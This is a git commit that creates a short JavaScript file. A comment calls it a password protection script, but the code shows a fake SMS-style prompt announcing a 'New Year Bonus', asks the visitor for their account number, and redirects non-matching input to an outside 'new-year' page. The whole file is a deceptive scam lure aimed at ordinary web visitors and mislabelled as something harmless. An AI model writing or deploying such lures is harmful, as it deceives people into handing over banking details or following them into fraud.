13a2496fa063b50a68e2cda30ac28b2c02add6c1
ukpeha55-stack <ukpeha55@gmail.com>
2026-01-01 03:59:09 +0100

    Create active-xmas.js

---
+++ active-xmas.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive New Year Bonus. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://frigrant.org/new-year.html';
+}
